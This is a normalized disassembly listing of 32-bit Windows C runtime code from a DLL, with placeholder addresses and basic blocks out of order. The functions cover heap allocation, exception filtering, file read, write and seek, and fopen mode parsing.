call sub_10008d46
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0x9
call sub_1000b7a4
push ebx
call sub_1000db37
pop ecx
mov [ ebp + 0xc ] eax
test eax eax
pop ecx
je r-xdata
mov eax edi
push esi
call sub_1000dade
test eax eax
pop ecx
jne r-xdata
push 0x9
call sub_1000b805
test esi esi
pop ecx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push eax
call sub_1000e342
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_1000de8d
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
push 0x9
call sub_1000b805
pop ecx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_1000a190
push ebx
push [ ebp + 0xc ]
call sub_1000db62
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_1000a190
push ebx
push [ ebp + 0xc ]
call sub_1000db62
add esp 0x14
mov eax esi
sub_1000c32b
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_1000dade
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x9
call sub_1000b7a4
push ebx
call sub_1000de8d
push 0x9
mov edi eax
call sub_1000b805
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_10009030
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_1000c3b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_1000b211
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_1000c4f6
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_1000c4f6
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_1000c530
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1000f2a8
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_1000c60c
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_1000c60c
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000f725
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_1000c671
push esi
mov edi eax
call sub_1000f784
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_1000c671
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_1000a55c
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1000caf1
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_1000c84a
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000f725
push esi
call sub_1000c8a7
push esi
mov edi eax
call sub_1000f784
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_1000c8a7
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000f6e3
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_1000a55c
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_1000f6e3
push 0x1
mov edi eax
call sub_1000f6e3
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_1000f6e3
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1000f664
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1000c92a
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10008d46
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1000c955
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000c983
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_1000f7a6
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_1000c983
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_1000cefd
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1000c9e8
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_1000b7a4
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_1000b805
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_10008913
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10008965
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_1000c955
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_1000c955
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_1000ca8c
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000f725
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_1000caf1
push esi
mov edi eax
call sub_1000f784
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_1000caf1
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000f6e3
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_1000a55c
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_1000cb64
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov esi [ edi + 0x10 ]
cmp [ edi + 0x4 ] ebx
mov [ ebp - 0xc ] esi
jge r-xdata
push 0x1
push ebx
push esi
call sub_1000ca8c
add esp 0xc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
or eax 0xffffffff
jmp r-xdata
mov ecx [ edi + 0xc ]
test cx 0x108
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov ebx eax
sub ebx edx
test cl 0x3
mov [ ebp - 0x8 ] ebx
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test cl 0x80
jne r-xdata
mov ebx esi
mov ecx esi
sar ebx 0x5
and ecx 0x1f
mov ebx [ ebx * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
test [ ebx + ecx * 4 + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_1000a5cf
mov [ eax ] 0x16
mov ecx edx
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
add eax ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
inc ecx
jmp r-xdata
inc [ ebp - 0x8 ]
sub eax edx
add eax ecx
mov [ ebp + 0x8 ] eax
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax esi
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ esi + eax + 0x4 ] 0x80
je r-xdata
and [ ebp - 0x8 ] ecx
jmp r-xdata
cmp ecx eax
jae r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0xc ]
call sub_1000ca8c
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_1000ca8c
mov eax 0x200
add esp 0xc
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
test [ edi + 0xd ] 0x20
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
inc [ ebp + 0x8 ]
test ch 0x4
je r-xdata
je r-xdata
inc eax
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x4
cmp eax ecx
jae r-xdata
sub_1000ccc5
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_1000f839
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_1000ce35
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_1000b7a4
xor esi esi
cmp [ rw-data ] ebx
pop ecx
jle r-xdata
push 0x2
call sub_1000b805
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax ebx
je r-xdata
push 0x38
shl esi 0x2
call sub_10008cba
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
add eax 0x20
push eax
call [ InitializeCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
inc esi
cmp esi [ rw-data ]
jl r-xdata
push eax
push esi
call sub_10008913
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
or [ edi + 0x10 ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
mov edi [ ecx + esi * 4 ]
jmp r-xdata
push eax
push esi
call sub_10008965
pop ecx
pop ecx
cmp edi ebx
je r-xdata
sub_1000cefd
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000f725
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_1000cf62
push esi
mov edi eax
call sub_1000f784
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_1000cf62
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_1000caf1
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_1000a5cf
mov [ eax ] 0x1c
call sub_1000a5d8
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_1000a55c
pop ecx
call sub_1000a5cf
mov [ eax ] 0x9
call sub_1000a5d8
mov [ eax ] esi
jmp r-xdata
sub_1000d0f0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_1000d174
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_1000f1fc
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_1000b318
pop esi
retn 0x4
sub_1000d1d8
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_10008cba
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_10008c87
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
